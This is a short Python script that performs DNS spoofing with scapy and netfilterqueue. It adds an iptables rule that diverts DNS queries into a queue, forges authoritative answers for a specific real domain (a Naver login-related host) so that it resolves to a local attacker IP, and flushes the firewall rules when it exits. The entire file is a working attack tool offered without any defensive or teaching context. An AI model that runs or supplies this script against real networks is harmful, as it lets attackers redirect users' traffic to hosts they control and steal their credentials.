from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

domain = 'static.nid.naver.com' # domain to be spoofed
localIP = '192.168.0.4' # IP address for poisoned hosts.

os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

def callback(packet):
    payload = packet.get_payload()
    pkt = IP(payload)
    
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        if domain in pkt[DNS].qd.qname:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))
            packet.set_payload(str(spoofed_pkt))
            packet.accept()
        else:
            packet.accept()

def main():
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run() # Main loop
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')

main()
